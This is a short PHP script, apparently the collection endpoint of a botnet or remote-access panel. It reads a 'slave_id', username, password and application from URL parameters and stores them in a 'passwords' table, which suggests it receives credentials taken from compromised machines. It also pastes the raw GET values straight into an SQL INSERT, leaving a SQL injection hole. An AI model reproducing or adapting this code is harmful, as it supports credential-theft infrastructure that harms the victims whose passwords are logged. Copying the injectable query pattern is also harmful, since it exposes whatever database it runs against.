<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
$slave_id = $_GET['id'];
$username = $_GET['username'];
$password = $_GET['password'];
$application = $_GET['application'];
$add_command = "INSERT INTO  passwords (slave_id, username, password, application)
                        VALUES ('$slave_id', '$username', '$password', '$application')";
        mysql_query($add_command, $connect);
?>